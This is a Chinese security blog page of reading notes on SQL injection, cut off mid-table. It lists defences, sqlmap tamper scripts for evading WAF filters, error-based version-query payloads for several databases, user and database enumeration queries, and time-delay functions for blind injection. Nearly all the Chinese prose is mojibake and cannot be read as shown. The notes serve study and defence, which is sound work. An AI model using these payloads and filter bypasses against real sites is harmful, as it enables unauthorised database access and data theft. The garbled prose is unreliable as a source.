

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Tr0y">
  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, åšå®¢, ä¿¡æ¯å®‰å…¨">
  
    <meta name="description" content="ã€ŠSQL æ³¨å…¥å…³è”åˆ†æã€‹-web å®‰å…¨-sm0nk">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL æ³¨å…¥å…³è”åˆ†æ">
<meta property="og:url" content="https://www.tr0y.wang/2018/04/07/SQL%E6%B3%A8%E5%85%A5%E5%85%B3%E8%81%94%E5%88%86%E6%9E%90-WooYun/">
<meta property="og:site_name" content="Tr0y&#39;s Blog">
<meta property="og:description" content="ã€ŠSQL æ³¨å…¥å…³è”åˆ†æã€‹-web å®‰å…¨-sm0nk">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/SQLi.png/cover">
<meta property="article:published_time" content="2018-04-07T10:09:30.000Z">
<meta property="article:modified_time" content="2023-12-13T08:57:48.000Z">
<meta property="article:author" content="Tr0y">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="æ³¨å…¥">
<meta property="article:tag" content="ä¹Œäº‘çŸ¥è¯†åº“">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/SQLi.png/cover">
  
  
  
  <title>SQL æ³¨å…¥å…³è”åˆ†æ - Tr0y&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/my.css">
<link rel="stylesheet" href="/css/my-piczoom.css">
<link rel="stylesheet" href="/css/my-code.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"ä¸¨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"ğŸŒ§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  
    <!-- Baidu Analytics -->
    <script async>
      if (!Fluid.ctx.dnt) {
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
      }
    </script>
  

  

  

  

  

  

  
    
  



  
<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Tr0y&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-books"></i>
                ç”Ÿå‘½çº¿
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-archive-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/gallery/">
                <i class="iconfont icon-images"></i>
                æ‘„å½±é›†
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="SQL æ³¨å…¥å…³è”åˆ†æ"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2018-04-07 10:09" pubdate>
          2018å¹´4æœˆ7æ—¥ 10:09:30
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          16k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          98 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar category-bar" style="margin-right: -1rem">
    





<div class="category-list">
  
  
    
    
    
    <div class="category row nomargin-x">
      <a class="category-item 
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="é˜…è¯»ç¬”è®°"
        id="heading-1dc2a11297f6b1a1a33974a34749e3d6" role="tab" data-toggle="collapse" href="#collapse-1dc2a11297f6b1a1a33974a34749e3d6"
        aria-expanded="true"
      >
        é˜…è¯»ç¬”è®°
        <span class="list-group-count">(11)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse show" id="collapse-1dc2a11297f6b1a1a33974a34749e3d6"
           role="tabpanel" aria-labelledby="heading-1dc2a11297f6b1a1a33974a34749e3d6">
        
        
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2018/11/07/CSRFMeiTuan/" title="FreeBuf æ–‡ç« ï¼šå¦‚ä½•é˜²æ­¢CSRFæ”»å‡»ï¼Ÿ"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">FreeBuf æ–‡ç« ï¼šå¦‚ä½•é˜²æ­¢CSRFæ”»å‡»ï¼Ÿ</span>
        </a>
      
    
      
      
        <a href="/2018/06/18/MySQL%E7%9A%84BIGINT%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" title="MySQL çš„ BIGINT æŠ¥é”™æ³¨å…¥"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">MySQL çš„ BIGINT æŠ¥é”™æ³¨å…¥</span>
        </a>
      
    
      
      
        <a href="/2018/04/07/SQL%E6%B3%A8%E5%85%A5%E5%85%B3%E8%81%94%E5%88%86%E6%9E%90-WooYun/" title="SQL æ³¨å…¥å…³è”åˆ†æ"
           class="list-group-item list-group-item-action
           active">
          <span class="category-post">SQL æ³¨å…¥å…³è”åˆ†æ</span>
        </a>
      
    
      
      
        <a href="/2018/04/08/WinPHPBug/" title="Windows+PHP=è·¯å¾„çˆ†ç ´?"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">Windows+PHP=è·¯å¾„çˆ†ç ´?</span>
        </a>
      
    
      
      
        <a href="/2017/11/11/JSDomBook/" title="ã€ŠJavaScript DOM ç¼–ç¨‹è‰ºæœ¯ã€‹"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">ã€ŠJavaScript DOM ç¼–ç¨‹è‰ºæœ¯ã€‹</span>
        </a>
      
    
      
      
        <a href="/2017/12/24/SQLInjection/" title="ã€ŠSQL æ³¨å…¥æ”»å‡»ä¸é˜²å¾¡ã€‹"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">ã€ŠSQL æ³¨å…¥æ”»å‡»ä¸é˜²å¾¡ã€‹</span>
        </a>
      
    
      
      
        <a href="/2018/01/22/WEBFS/" title="ã€ŠWeb å‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜ã€‹"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">ã€ŠWeb å‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜ã€‹</span>
        </a>
      
    
      
      
        <a href="/2017/11/04/TJMMX-BOOK/" title="ã€Šå›¾è§£å¯†ç å­¦ã€‹"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">ã€Šå›¾è§£å¯†ç å­¦ã€‹</span>
        </a>
      
    
      
      
        <a href="/2018/10/14/sorts/" title="ä¹å¤§æ’åºç®—æ³•çš„ Python å®ç°"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">ä¹å¤§æ’åºç®—æ³•çš„ Python å®ç°</span>
        </a>
      
    
      
      
        <a href="/2018/11/03/XSSMeiTuan/" title="å¦‚ä½•é˜²æ­¢XSSæ”»å‡»ï¼Ÿ"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">å¦‚ä½•é˜²æ­¢XSSæ”»å‡»ï¼Ÿ</span>
        </a>
      
    
      
      
        <a href="/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" class="list-group-item list-group-item-action">
          <span class="category-post">More...</span>
        </a>
        
  </div>

        
      </div>
    </div>
  
</div>


  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">SQL æ³¨å…¥å…³è”åˆ†æ</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2 å¹´å‰
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>ã€ŠSQL æ³¨å…¥å…³è”åˆ†æã€‹-web å®‰å…¨-sm0nk</p>
<span id="more"></span>
<h2 id="é˜…è¯»ç¬”è®°">é˜…è¯»ç¬”è®°</h2>
<h3 id="x00-åº">0x00 åº</h3>
<ol type="1">
<li><p>å…³è”åˆ†æï¼Œå³ä»ä¸€ä¸ªæ•°æ®é›†ä¸­å‘ç°é¡¹ä¹‹é—´çš„éšè—å…³ç³»ã€‚</p>
<p>æœ¬æ–‡ç»“æ„å¦‚ä¸‹ï¼š</p>
<figure>
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SQLæ³¨å…¥å…³è”åˆ†æ-WooYun/1540348926.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload alt="æœ¬æ–‡ç»“æ„" /><figcaption aria-hidden="true">æœ¬æ–‡ç»“æ„</figcaption>
</figure></li>
<li><p>SQL æ³¨å…¥ç§‘æ™®</p>
<p>ä¸€å¥è¯ï¼šé€šè¿‡åœ¨ç”¨æˆ·å¯æ§å‚æ•°ä¸­æ³¨å…¥ SQL è¯­æ³•ï¼Œç ´ååŸæœ‰ SQL ç»“æ„ï¼Œè¾¾åˆ°ç¼–å†™ç¨‹åºæ—¶æ„æ–™ä¹‹å¤–ç»“æœçš„æ”»å‡»è¡Œä¸ºã€‚</p>
<p>å½±å“ï¼šæ•°æ®åº“å¢åˆ æ”¹æŸ¥ã€åå°ç™»å½•ã€getshell</p>
<p>ä¿®å¤ï¼š</p>
<ol type="1">
<li>ä½¿ç”¨å‚æ•°æ£€æŸ¥çš„æ–¹å¼ï¼Œæ‹¦æˆªå¸¦æœ‰ SQL è¯­æ³•çš„å‚æ•°ä¼ å…¥åº”ç”¨ç¨‹åº</li>
<li>ä½¿ç”¨é¢„ç¼–è¯‘çš„å¤„ç†æ–¹å¼å¤„ç†æ‹¼æ¥äº†ç”¨æˆ·å‚æ•°çš„ SQL è¯­å¥</li>
<li>åœ¨å‚æ•°å³å°†è¿›å…¥æ•°æ®åº“æ‰§è¡Œä¹‹å‰ï¼Œå¯¹ SQL è¯­å¥çš„è¯­ä¹‰è¿›è¡Œå®Œæ•´æ€§æ£€æŸ¥ï¼Œç¡®è®¤è¯­ä¹‰æ²¡æœ‰å‘ç”Ÿå˜åŒ–</li>
<li>åœ¨å‡ºç° SQL æ³¨å…¥æ¼æ´æ—¶ï¼Œè¦åœ¨å‡ºç°é—®é¢˜çš„å‚æ•°æ‹¼æ¥è¿› SQL è¯­å¥å‰è¿›è¡Œè¿‡æ»¤æˆ–è€…æ ¡éªŒï¼Œä¸è¦ä¾èµ–ç¨‹åºæœ€å¼€å§‹å¤„é˜²æŠ¤ä»£ç </li>
<li>å®šæœŸå®¡è®¡æ•°æ®åº“æ‰§è¡Œæ—¥å¿—ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨åº”ç”¨ç¨‹åºæ­£å¸¸é€»è¾‘ä¹‹å¤–çš„ SQL è¯­å¥æ‰§è¡Œ</li>
</ol></li>
<li><p>æ³¨å…¥åˆ†ç±»</p>
<ol type="1">
<li>æŒ‰ç…§æ•°æ®åŒ…æ–¹å¼åˆ†ç±»
<ol type="1">
<li>Get post cookie auth</li>
</ol></li>
<li>æŒ‰ç…§å‘ˆç°å½¢å¼
<ol type="1">
<li>å›æ˜¾å‹æ³¨å…¥
<ol type="1">
<li>Int string search</li>
</ol></li>
<li>ç›²æ³¨
<ol type="1">
<li>Error bool time</li>
</ol></li>
<li>å¦ç±»æ³¨å…¥
<ol type="1">
<li>å®½å­—èŠ‚æ³¨å…¥</li>
<li>http header æ³¨å…¥</li>
<li>ä¼ªé™æ€</li>
<li>Base64 å˜å½¢</li>
</ol></li>
</ol></li>
</ol></li>
</ol>
<h3 id="x02-ç¥å™¨è§£è¯»">0x02 ç¥å™¨è§£è¯»</h3>
<p><strong>Tamper æ¦‚è§ˆ</strong></p>
<table>

<thead>
<tr class="header">
<th>è„šæœ¬åç§°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>apostrophemask.py</td>
<td>ç”¨ utf8 ä»£æ›¿å¼•å·</td>
</tr>
<tr class="even">
<td>equaltolike.py</td>
<td>like ä»£æ›¿ç­‰å·</td>
</tr>
<tr class="odd">
<td>space2dash.py</td>
<td>ç»•è¿‡è¿‡æ»¤â€˜=â€™ æ›¿æ¢ç©ºæ ¼å­—ç¬¦ï¼ˆâ€ï¼‰ï¼Œï¼ˆ'' â€“ 'ï¼‰åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šï¼Œä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ–°è¡Œï¼ˆâ€™ nâ€™ï¼‰</td>
</tr>
<tr class="even">
<td>greatest.py</td>
<td>ç»•è¿‡è¿‡æ»¤â€™&gt;â€™ ,ç”¨ GREATEST æ›¿æ¢å¤§äºå·ã€‚</td>
</tr>
<tr class="odd">
<td>space2hash.py</td>
<td>ç©ºæ ¼æ›¿æ¢ä¸º#å· éšæœºå­—ç¬¦ä¸² ä»¥åŠæ¢è¡Œç¬¦</td>
</tr>
<tr class="even">
<td>apostrophenullencode.py</td>
<td>ç»•è¿‡è¿‡æ»¤åŒå¼•å·ï¼Œæ›¿æ¢å­—ç¬¦å’ŒåŒå¼•å·ã€‚</td>
</tr>
<tr class="odd">
<td>halfversionedmorekeywords.py</td>
<td>å½“æ•°æ®åº“ä¸º mysql æ—¶ç»•è¿‡é˜²ç«å¢™ï¼Œæ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ  mysql ç‰ˆæœ¬è¯„è®º</td>
</tr>
<tr class="even">
<td>space2morehash.py</td>
<td>ç©ºæ ¼æ›¿æ¢ä¸º #å· ä»¥åŠæ›´å¤šéšæœºå­—ç¬¦ä¸² æ¢è¡Œç¬¦</td>
</tr>
<tr class="odd">
<td>appendnullbyte.py</td>
<td>åœ¨æœ‰æ•ˆè´Ÿè·ç»“æŸä½ç½®åŠ è½½é›¶å­—èŠ‚å­—ç¬¦ç¼–ç </td>
</tr>
<tr class="even">
<td>ifnull2ifisnull.py</td>
<td>ç»•è¿‡å¯¹ IFNULL è¿‡æ»¤ã€‚ æ›¿æ¢ç±»ä¼¼â€™IFNULL(A, B)â€™ä¸ºâ€™IF(ISNULL(A), B, A)â€™</td>
</tr>
<tr class="odd">
<td>space2mssqlblank.py</td>
<td>ç©ºæ ¼æ›¿æ¢ä¸ºå…¶å®ƒç©ºç¬¦å·</td>
</tr>
<tr class="even">
<td>base64encode.py</td>
<td>ç”¨ base64 ç¼–ç æ›¿æ¢</td>
</tr>
<tr class="odd">
<td>space2mssqlhash.py</td>
<td>æ›¿æ¢ç©ºæ ¼</td>
</tr>
<tr class="even">
<td>modsecurityversioned.py</td>
<td>è¿‡æ»¤ç©ºæ ¼ï¼ŒåŒ…å«å®Œæ•´çš„æŸ¥è¯¢ç‰ˆæœ¬æ³¨é‡Š</td>
</tr>
<tr class="odd">
<td>space2mysqlblank.py</td>
<td>ç©ºæ ¼æ›¿æ¢å…¶å®ƒç©ºç™½ç¬¦å·(mysql)</td>
</tr>
<tr class="even">
<td>between.py</td>
<td>ç”¨ between æ›¿æ¢å¤§äºå·ï¼ˆ&gt;ï¼‰</td>
</tr>
<tr class="odd">
<td>space2mysqldash.py</td>
<td>æ›¿æ¢ç©ºæ ¼å­—ç¬¦ï¼ˆâ€ï¼‰ï¼ˆâ€™ â€“ â€˜ï¼‰åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šä¸€ä¸ªæ–°è¡Œï¼ˆâ€™ nâ€™ï¼‰</td>
</tr>
<tr class="even">
<td>multiplespaces.py</td>
<td>å›´ç»• SQL å…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼</td>
</tr>
<tr class="odd">
<td>space2plus.py</td>
<td>ç”¨+æ›¿æ¢ç©ºæ ¼</td>
</tr>
<tr class="even">
<td>bluecoat.py</td>
<td>ä»£æ›¿ç©ºæ ¼å­—ç¬¦åä¸ä¸€ä¸ªæœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦çš„ SQL è¯­å¥ã€‚ ç„¶åæ›¿æ¢=ä¸º like</td>
</tr>
<tr class="odd">
<td>nonrecursivereplacement.py</td>
<td>å–ä»£ predefined SQL å…³é”®å­— with è¡¨ç¤º suitable for æ›¿ä»£ï¼ˆä¾‹å¦‚ .replaceï¼ˆâ€œSELECTâ€ã€â€â€)ï¼‰ filters</td>
</tr>
<tr class="even">
<td>space2randomblank.py</td>
<td>ä»£æ›¿ç©ºæ ¼å­—ç¬¦ï¼ˆâ€œâ€ï¼‰ä»ä¸€ä¸ªéšæœºçš„ç©ºç™½å­—ç¬¦å¯é€‰å­—ç¬¦çš„æœ‰æ•ˆé›†</td>
</tr>
<tr class="odd">
<td>sp_password.py</td>
<td>è¿½åŠ  sp_passwordâ€™ä» DBMS æ—¥å¿—çš„è‡ªåŠ¨æ¨¡ç³Šå¤„ç†çš„æœ‰æ•ˆè½½è·çš„æœ«å°¾</td>
</tr>
<tr class="even">
<td>chardoubleencode.py</td>
<td>åŒ url ç¼–ç (ä¸å¤„ç†ä»¥ç¼–ç çš„)</td>
</tr>
<tr class="odd">
<td>unionalltounion.py</td>
<td>æ›¿æ¢ UNION ALL SELECT UNION SELECT</td>
</tr>
<tr class="even">
<td>charencode.py</td>
<td>url ç¼–ç </td>
</tr>
<tr class="odd">
<td>randomcase.py</td>
<td>éšæœºå¤§å°å†™</td>
</tr>
<tr class="even">
<td>unmagicquotes.py</td>
<td>å®½å­—ç¬¦ç»•è¿‡ GPC addslashes</td>
</tr>
<tr class="odd">
<td>randomcomments.py</td>
<td>ç”¨/**/åˆ†å‰² sql å…³é”®å­—</td>
</tr>
<tr class="even">
<td>charunicodeencode.py</td>
<td>å­—ç¬¦ä¸² unicode ç¼–ç </td>
</tr>
<tr class="odd">
<td>securesphere.py</td>
<td>è¿½åŠ ç‰¹åˆ¶çš„å­—ç¬¦ä¸²</td>
</tr>
<tr class="even">
<td>versionedmorekeywords.py</td>
<td>æ³¨é‡Šç»•è¿‡</td>
</tr>
<tr class="odd">
<td>space2comment.py</td>
<td>Replaces space character (â€˜ â€˜) with comments â€˜/**/â€™</td>
</tr>
</tbody>
</table>
<h3 id="x03-æ•°æ®åº“ç‰¹æ€§">0x03 æ•°æ®åº“ç‰¹æ€§</h3>
<h4 id="web-æŠ¥é”™å…³é”®å­—">Web æŠ¥é”™å…³é”®å­—</h4>
<ol type="1">
<li>Microsoft OLE DB Provider</li>
<li>ORA-</li>
<li>PLS-</li>
<li>Error in your SQL Syntax</li>
<li>SQL Error</li>
<li>Incorrect Syntax near</li>
<li>Failed Mysql</li>
<li>Unclosed Quotation Mark</li>
<li>JDBC/ODBC Driver</li>
</ol>
<h4 id="ç‰ˆæœ¬æŸ¥è¯¢">ç‰ˆæœ¬æŸ¥è¯¢</h4>
<ol type="1">
<li><p>Mysql: <code>/?param=1 select count(*) from information_schema.tables group by**concat(version(),floor(rand(0)*2))</code></p></li>
<li><p>MSSQL: <code>/?param=1 and(1)=convert(int,@@version)--</code></p></li>
<li><p>Sybase: <code>/?param=1 and(1)=convert(int,@@version)--</code></p></li>
<li><p>Oracle &gt;=9.0:<code>/?param=1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select replace(banner,chr(32),chr(58)) from sys.v\_$version where rownum=1)||chr(62))) from dual)â€”</code></p></li>
<li><p>PostgreSQL: <code>/?param=1 and(1)=cast(version() as numeric)--</code></p>
<p>â€‹</p></li>
</ol>
<h4 id="sql-æ–¹è¨€å·®å¼‚">SQL æ–¹è¨€å·®å¼‚</h4>
<table>
<thead>
<tr class="header">
<th>DB</th>
<th>è¿æ¥ç¬¦</th>
<th>è¡Œæ³¨é‡Š</th>
<th>å”¯ä¸€çš„é»˜è®¤è¡¨å˜é‡å’Œå‡½æ•°</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>MSSQL</td>
<td>%2Bï¼ˆURL+å·ç¼–ç ï¼‰(e.g. ?category=shoâ€™%2bâ€™es)</td>
<td><code>--</code></td>
<td>@<span class="citation" data-cites="PACK_RECEIVED">@PACK_RECEIVED</span></td>
</tr>
<tr class="even">
<td>MYSQL</td>
<td>%20 ï¼ˆURL ç©ºæ ¼ç¼–ç ï¼‰</td>
<td><code>#</code></td>
<td>CONNECTION_ID()</td>
</tr>
<tr class="odd">
<td>Oracle</td>
<td>ll</td>
<td><code>--</code></td>
<td><code>--</code></td>
</tr>
<tr class="even">
<td>PGsql</td>
<td>ll</td>
<td><code>--</code></td>
<td>getpgusername()</td>
</tr>
<tr class="odd">
<td>Access</td>
<td>â€œaâ€ &amp; â€œbâ€</td>
<td>N/A</td>
<td>msysobjects</td>
</tr>
</tbody>
</table>
<h4 id="sql-å¸¸ç”¨è¯­å¥">SQL å¸¸ç”¨è¯­å¥</h4>
<table>

<thead>
<tr class="header">
<th>å†…å®¹</th>
<th>MSSQL</th>
<th>MYSQL</th>
<th>ORACLE</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>æŸ¥çœ‹ç‰ˆæœ¬</td>
<td>select @<span class="citation" data-cites="version">@version</span></td>
<td>select @<span class="citation" data-cites="version">@version</span> select version()</td>
<td>Select banner from v$version;</td>
</tr>
<tr class="even">
<td>å½“å‰ç”¨æˆ·</td>
<td>select system_users; select suer_sname(); select user; select loginname from master..sysprocesses WHERE spid =@<span class="citation" data-cites="SPID">@SPID</span>;</td>
<td>select user(); select system_user();</td>
<td>Select user from dual</td>
</tr>
<tr class="odd">
<td>åˆ—å‡ºç”¨æˆ·</td>
<td>select name from master..syslogins;</td>
<td>select user from mysql.user;</td>
<td>Select username from all_users ORDER BY username; Select username from all_users;</td>
</tr>
<tr class="even">
<td>å½“å‰åº“</td>
<td>select DB_NAME();</td>
<td>select database();</td>
<td>Select global_name from global_name;</td>
</tr>
<tr class="odd">
<td>åˆ—å‡ºæ•°æ®åº“</td>
<td>select name from master..sysdatabases;</td>
<td>select schema_name from information_schema.schemata;</td>
<td>Select ower,table_name from all_users; #åˆ—å‡ºè¡¨æ˜</td>
</tr>
<tr class="even">
<td>å½“å‰ç”¨æˆ·æƒé™</td>
<td>select is_srvolemenber(â€˜sysadminâ€™);</td>
<td>select grantee, privilege_type,is_grantable from information schema.user privileges;</td>
<td>Select * from user role_privs; Select * from user_sys_privs;</td>
</tr>
<tr class="odd">
<td>æœåŠ¡å™¨ä¸»æœºå</td>
<td>select @<span class="citation" data-cites="servername">@servername</span>;</td>
<td>/</td>
<td>Select sys_context(â€˜USERENVâ€™,â€™HOSTâ€™) from dual;</td>
</tr>
</tbody>
</table>
<h4 id="ç›²æ³¨å‡½æ•°">ç›²æ³¨å‡½æ•°</h4>
<table>

<thead>
<tr class="header">
<th>æ•°æ®</th>
<th>MSSQL</th>
<th>Mysql</th>
<th>oracle</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>å­—ç¬¦ä¸²é•¿åº¦</td>
<td>LEN()</td>
<td>LENGTH()</td>
<td>LENGTH()</td>
</tr>
<tr class="even">
<td>ä»ç»™å®šå­—ç¬¦ä¸²ä¸­æå–å­ä¸²</td>
<td>SUBSTRING(string,offset,length)</td>
<td>SELECT SUBSTR(string,offset,length)</td>
<td>SELECT SUBSTR(string,offset,length) From dual</td>
</tr>
<tr class="odd">
<td>å­—ç¬¦ä¸²(â€˜ABCâ€™)ä¸å¸¦å•å¼•å·çš„è¡¨ç¤ºæ–¹å¼</td>
<td>SELECT CHAR(0X41)+CHAR(0X42)+ CHAR(0X43)</td>
<td>Select char(65,66,67)</td>
<td>Select chr(65)llchr(66)+chr(67) from dual</td>
</tr>
<tr class="even">
<td>è§¦å‘å»¶æ—¶</td>
<td>WAITFOR DELAY â€˜0:0:9â€™</td>
<td>BENCHMARK(1000000,MD5(â€œHACKâ€)) Sleep(10)</td>
